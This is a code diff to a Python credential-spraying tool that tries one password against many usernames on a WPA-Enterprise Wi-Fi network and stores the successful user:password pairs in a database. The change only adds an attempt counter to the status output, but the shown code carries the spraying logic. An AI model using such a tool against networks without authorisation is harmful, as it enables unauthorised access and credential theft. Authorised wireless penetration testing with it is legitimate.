@@ -29,11 +29,12 @@ except Exception as e:
      sys.exit(1)
 
 class eapSpray(threading.Thread):
-	def __init__(self, ssid, user, password, ca_cert, ca_path, client_cert, supplicantInt, interface):
+	def __init__(self, ssid, user, userList, password, ca_cert, ca_path, client_cert, supplicantInt, interface):
 		threading.Thread.__init__(self)
 		self.setDaemon(1) # Creates Thread in daemon mode
 		self.ssid = ssid
 		self.user = user
+		self.userList = userList # original userList prior to Queue_user, used to enumerate user count.
 		self.password = password
 		self.ca_cert = ca_cert
 		self.ca_path = ca_path
@@ -46,14 +47,18 @@ class eapSpray(threading.Thread):
 		timestr = time.strftime("%Y%m%d-%H%M") # NOT SURE I NEED THIS ANY LONGER
 		# Time Stamp for entire credential spray
 		curr_time1 = time.time()
-		
 		# Container of successfully authenticated user
 		successList = []
+		# Count number of users in list
+		user_list_length = len(self.userList)
 
 		while not self.user.empty():
+
 			cls()
 			banner()
+			user_counter = 0
 			for user in self.user.get():
+				user_counter +=1
 				# Time Stamp for each user
 				curr_time2 = time.time()
 				#DEBUG PRINT
@@ -85,7 +90,6 @@ class eapSpray(threading.Thread):
 				# DEBUG: Print Current WPA CONF
 				# print('DEBUG: WPA CONF')
 				# print(interface.get_current_network())	
-
 				while True:
 					if self.interface.get_state() == 'completed':
 						print(' Brute-forcing SSID : ' + ' ' + self.ssid)
@@ -93,7 +97,8 @@ class eapSpray(threading.Thread):
 						print(' Interface          : ' + ' ' + self.interface.get_ifname())
 						print(' Interface Status   : ' + ' ' + self.interface.get_state())
 						print(' Authentication     : ' + ' Success: '+ colors.green + '[!]' + colors.normal)
-						print(' Elapsed Time       :  %.1fs\n' % (time.time() - curr_time2))
+						print(' Elapsed Time       :  %.1fs' % (time.time() - curr_time2))
+						print(' Attempts           :  [%s/%s]\n' % (user_counter, user_list_length))
 						userSuccess = user + ":" + self.password
 						successList.append(userSuccess)
 						db.eapspray_commit(self.ssid, user, self.password)
@@ -107,7 +112,8 @@ class eapSpray(threading.Thread):
 						print(' Interface          : ' + ' ' + self.interface.get_ifname())
 						print(' Interface Status   : ' + ' ' + self.interface.get_state())
 						print(' Authentication     : ' + ' Failed: '+ colors.red + '[!]' + colors.normal)
-						print(' Elapsed Time       :  %.1fs\n ' % (time.time() - curr_time2))
+						print(' Elapsed Time       :  %.1fs ' % (time.time() - curr_time2))
+						print(' Attempts           :  [%s/%s]\n' % (user_counter, user_list_length))
 						# Remove from associated network, which results in state: 'inactive'
 						self.interface.remove_network(self.supplicantInt+'/Networks/0')
 						# Wait for inactive state, based on a timer.
